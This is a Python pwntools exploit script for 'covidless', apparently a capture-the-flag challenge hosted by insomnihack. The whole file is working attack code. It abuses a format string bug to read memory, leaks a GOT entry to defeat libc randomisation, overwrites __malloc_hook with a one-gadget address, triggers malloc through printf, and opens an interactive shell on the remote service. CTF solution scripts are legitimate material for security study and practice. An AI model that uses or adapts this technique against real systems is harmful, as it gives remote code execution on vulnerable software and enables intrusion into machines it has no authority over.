#!/usr/bin/env python2
from pwn import *

# Definitions
libc = ELF('./libc.so.6',checksec=False)
io = remote('covidless.insomnihack.ch',6666)

# Dummy value to initialize puts
def dummy():
    io.recvrepeat(0.3)
    io.sendline('dummy')

# Read value at address
def fmt_str_read(addr):
    io.recvrepeat(0.3)
    io.sendline('%14$s###########'+p64(addr))
    out = io.recvuntil('###########').split('###########')[0]
    out = out.split('Your covid pass is invalid : ')[1]
    out = out.split('#elev$delim')[0]
    return out

# Overwrite a single byte
def fmt_str_write_byte(addr, byte):
    if byte <= 107:
        pad = 107 - byte        
        payload = 'A'*byte+'%26$n'+'A'*pad+p64(addr)
    else:
        payload = '%0'+str(byte)+'x%14$n#####'+p64(addr)

    io.recvrepeat(0.3)
    io.sendline(payload)
    io.recvrepeat(0.3)


# Overwrite data at address
def fmt_str_write(addr, value):
    for c in value:
        fmt_str_write_byte(addr, ord(c))
        addr += 1

# Leak puts@got and get libc base
def leak_libc():
    libc.address = u64(fmt_str_read(0x601018).ljust(8,'\x00')) - 0x0809c0
    log.success('Libc: ' + hex(libc.address))
   
# Exploit
def pwn():
    dummy()
    leak_libc()

    # Overwrite __malloc_hook w/ onegadget and force printf to malloc
    fmt_str_write(libc.sym['__malloc_hook'],p64(libc.address+0x4f322))
    io.sendline('%10000000c')

    # Clean junk data
    io.recvrepeat(0.3)

pwn()
io.interactive()